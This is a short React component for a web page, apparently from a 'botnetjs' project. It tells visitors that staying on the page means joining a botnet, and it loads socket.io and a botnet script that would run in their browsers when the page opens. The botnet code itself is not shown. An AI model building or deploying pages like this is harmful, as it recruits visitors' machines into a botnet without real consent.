var React = require('react')
var DefaultLayout = require('./layouts/default')

var HomePage = React.createClass({
    render: function () {
        return (
                <DefaultLayout title={this.props.title}>
                    <div>By visiting and remaining on this page you agree to participate in a botnet project.</div>
                    <script src="/socket.io/socket.io.js"></script>
                    <script src="/botnetjs/botnet.js"></script>
                </DefaultLayout>
               )
    }
})

module.exports = HomePage
